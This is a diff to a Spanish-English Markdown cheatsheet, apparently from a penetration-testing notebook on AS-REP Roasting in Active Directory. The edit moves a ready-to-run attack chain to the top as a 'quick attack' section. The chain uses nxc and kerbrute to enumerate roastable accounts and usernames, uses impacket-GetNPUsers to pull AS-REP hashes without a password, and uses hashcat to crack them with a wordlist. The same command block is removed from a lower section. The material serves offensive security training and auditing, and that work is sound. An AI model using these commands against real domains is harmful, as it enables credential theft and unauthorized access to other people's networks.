@@ -36,7 +36,32 @@ linked:
 
 ## Cheatsheet
 
-### 🔍 Discovery
+### 1. Ataque Rápido (TL;DR)
+
+```bash
+# 1. Discovery
+nxc ldap <DC> -u user -p pass --asreproastable
+
+# 2. Bulk roast (auth)
+nxc ldap <DC> -u user -p pass --asreproast asrep.hash
+
+# 3. Bulk roast (unauth, post-username-enum)
+kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt
+awk '{print $NF}' valid.txt | sed 's/@.*//' > clean.txt
+impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile clean.txt -no-pass -format hashcat -outputfile asrep.hash
+
+# 4. Crack
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -O
+
+# 5. Validate
+hashcat -m 18200 asrep.hash --show
+```
+
+---
+
+### 2. Explotación
+
+#### 🔍 Discovery
 
 ````tabs
 tab: **LDAP Filter (UAC bit 4194304)**
@@ -61,7 +86,7 @@ tab: **Auditoría Defender**
 ![[AS-REP Roasting - Discovery#^asrep-discovery-audit]]
 ````
 
-### 🚪 Roast Without Auth
+#### 🚪 Roast Without Auth
 
 ````tabs
 tab: **Concept**
@@ -86,7 +111,7 @@ tab: **Common Errors**
 ![[AS-REP Roasting - Roast Without Auth#^asrep-unauth-errors]]
 ````
 
-### 🎫 Roast With Auth & Crack
+#### 🎫 Roast With Auth & Crack
 
 ````tabs
 tab: **Impacket GetNPUsers Auth**
@@ -114,7 +139,7 @@ tab: **Common Errors**
 ![[AS-REP Roasting - Roast With Auth y Crack#^asrep-auth-errors]]
 ````
 
-### 🎯 Targeted Roasting
+#### 🎯 Targeted Roasting
 
 ````tabs
 tab: **Concept**
@@ -145,7 +170,7 @@ tab: **Common Errors**
 ![[AS-REP Roasting - Targeted Roasting#^asrep-targeted-errors]]
 ````
 
-### 👥 Username Enumeration
+#### 👥 Username Enumeration
 
 ````tabs
 tab: **kerbrute userenum**
@@ -167,7 +192,7 @@ tab: **Common Errors**
 ![[AS-REP Roasting - Username Enumeration#^asrep-userenum-errors]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **Impacket-GetNPUsers**
@@ -267,29 +292,6 @@ tab: **Recursos**
 7. Cleanup:
    - Restore UAC flag (targeted)
    - klist purge
-```
-
----
-
-## Detección rápida
-
-```bash
-# 1. Discovery
-nxc ldap <DC> -u user -p pass --asreproastable
-
-# 2. Bulk roast (auth)
-nxc ldap <DC> -u user -p pass --asreproast asrep.hash
-
-# 3. Bulk roast (unauth, post-username-enum)
-kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt
-awk '{print $NF}' valid.txt | sed 's/@.*//' > clean.txt
-impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile clean.txt -no-pass -format hashcat -outputfile asrep.hash
-
-# 4. Crack
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -O
-
-# 5. Validate
-hashcat -m 18200 asrep.hash --show
 ```
 
 ---
